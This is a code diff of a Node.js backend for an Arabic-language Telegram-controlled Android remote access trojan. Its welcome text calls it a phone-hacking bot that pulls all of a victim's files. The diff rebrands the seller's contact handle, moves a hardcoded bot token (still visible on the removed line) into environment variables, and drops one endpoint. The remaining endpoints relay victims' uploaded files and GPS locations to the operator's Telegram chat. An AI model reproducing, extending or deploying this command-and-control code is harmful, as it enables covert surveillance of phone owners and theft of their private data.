@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8924997433:AAEYAMCDxus45Ahk8-V2K2GIjlFMsOECa1E'
-const id = '8314983839'
+const token = process.env.to;
+const id = process.env.id;
 const address = 'https://www.google.com'
 
 const app = express();
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">تم بنجاح تشغيل @VlP_12</h1>')
+    res.send('<h1 align="center">تم بنجاح تشغيل @lllllDONlllll</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -40,10 +40,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
         })
     res.send('')
 })
-app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body[' @VlP_12'], {parse_mode: "HTML"})
-    res.send('')
-})
+
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
     appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
@@ -108,7 +105,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة   @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة   @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -128,7 +125,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -148,7 +145,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -168,7 +165,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -188,7 +185,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -208,7 +205,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -228,7 +225,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -248,7 +245,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -277,7 +274,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -297,7 +294,7 @@ appBot.on('message', (message) => {
             currentUuid = ''
             appBot.sendMessage(id,
                 '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @VlP_12،',
+                '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل @lllllDONlllll،',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
@@ -311,7 +308,7 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°• مطور الملف المنحرف  لطلب نسخة  @VlP_12 \n\n' +
+                '°• مطور الملف المنحرف  لطلب نسخة  @lllllDONlllll \n\n' +
                 '• اهلا بك في اول بوت اختراق هواتف بالوطن العربي\n\n' +
                 '• البوت يعمل مثل برامج الرات ولكن بصيغه اسهل\n\n' +
                 '• يمكنك اختراق اجهزه الاندرويد وسحب جميع ملفات الضحيه\n\n' +
@@ -437,7 +434,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -456,7 +453,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -475,7 +472,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -494,7 +491,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -513,7 +510,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -532,7 +529,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -551,7 +548,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -570,7 +567,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -589,7 +586,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -608,7 +605,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -627,7 +624,7 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @VlP_12،',
+            '• ستتلقى ردًا في اللحظات القليلة القادمة لتواصل   @lllllDONlllll،',
             {
                 parse_mode: "HTML",
                 "reply_markup": {
@@ -718,3 +715,4 @@ setInterval(function () {
     }
 }, 5000)
 appServer.listen(process.env.PORT || 8999);
+
